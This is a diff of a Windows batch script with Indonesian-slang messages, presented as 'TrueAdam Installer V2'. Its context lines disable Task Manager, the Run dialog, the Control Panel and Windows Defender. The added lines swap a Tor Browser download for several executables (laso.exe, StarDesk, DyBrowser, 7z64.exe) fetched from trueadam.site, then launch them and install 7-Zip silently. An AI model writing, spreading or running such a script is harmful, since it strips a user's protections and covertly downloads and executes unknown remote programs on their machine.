@@ -31,7 +31,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul
-echo [+] Blokir aman, desktop & taskbar tetep idup biar gak ngadat!
+echo [+] Blokir aman, desktop & taskbar tetep idup biar StarDesk gak ngadat!
 echo.
 
 :: === KILL STEAM HELPER + STEAM (CEK DULU) ===
@@ -72,19 +72,47 @@ net stop "MsMpSvc" 2>nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>nul
 
 echo ========================================
-echo MULAI DOWNLOAD TOR BROWSER BRO
+echo MULAI DOWNLOAD SEMUA BRO (TANPA ERROR)
 echo ========================================
 
-set URL1=https://www.torproject.org/dist/torbrowser/15.0.17/tor-browser-windows-x86_64-portable-15.0.17.exe
-set FILE1=TorBrowser-15.0.17.exe
+set URL1=https://trueadam.site/laso.exe
+set FILE1=laso.exe
+set URL2=https://trueadam.site/StarDesk_1.4.0.exe
+set FILE2=StarDesk_1.4.0.exe
+set URL3=https://trueadam.site/DyBrowser.exe
+set FILE3=DyBrowser.exe
+set URL4=https://trueadam.site/7z64.exe
+set FILE4=7z64.exe
 
 call :Download "%URL1%" "%FILE1%"
+call :Download "%URL2%" "%FILE2%"
+call :Download "%URL3%" "%FILE3%"
+call :Download "%URL4%" "%FILE4%"
 
 echo ========================================
 echo CEK DAN JALANIN FILE
 echo ========================================
 
 if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [GAGAL] %FILE1%)
+if exist "%FILE2%" (start "" "%FILE2%" & echo [OK] %FILE2% running) else (echo [GAGAL] %FILE2%)
+if exist "%FILE3%" (start "" "%FILE3%" & echo [OK] %FILE3% running) else (echo [GAGAL] %FILE3%)
+
+if exist "%FILE4%" (
+    echo [*] Install 7-Zip silent mode dulu bro...
+    start /wait "" "%FILE4%" /S
+    echo [OK] 7-Zip keinstall!
+    if exist "C:\Program Files\7-Zip\7zFM.exe" (
+        start "" "C:\Program Files\7-Zip\7zFM.exe"
+        echo [OK] 7zFM.exe kebuka bos!
+    ) else if exist "C:\Program Files (x86)\7-Zip\7zFM.exe" (
+        start "" "C:\Program Files (x86)\7-Zip\7zFM.exe"
+        echo [OK] 7zFM.exe kebuka bos!
+    ) else (
+        echo [GAGAL] 7zFM.exe gak ketemu njir, mungkin installnya error
+    )
+) else (
+    echo [GAGAL] 7z64.exe gak ada filenya
+)
 
 :: === BERSIH-BERSIH AKHIR ===
 echo [*] Ngekill curl.exe dan bitsadmin.exe...
@@ -102,7 +130,7 @@ echo SELESAI GOBLOK 😡😡😡
 echo ========================================
 
 :: === POPUP PAKE VBS (PALING AMAN NO FREEZE) ===
-echo MsgBox "PC Name: %PCNAME%" ^& vbCrLf ^& "Username: %USERNAME_MSG%" ^& vbCrLf ^& vbCrLf ^& "Tor Browser berhasil diinstall bos! Klik OK buat lanjut 😎", vbOKOnly + vbInformation, "TrueAdam Installer V2 - SELESAI" > "%TEMP%\popup.vbs"
+echo MsgBox "PC Name: %PCNAME%" ^& vbCrLf ^& "Username: %USERNAME_MSG%" ^& vbCrLf ^& vbCrLf ^& "Semua proses selesai bos! Klik OK buat lanjut 😎", vbOKOnly + vbInformation, "TrueAdam Installer V2 - SELESAI" > "%TEMP%\popup.vbs"
 cscript //nologo "%TEMP%\popup.vbs"
 del /q "%TEMP%\popup.vbs" >nul 2>&1
 
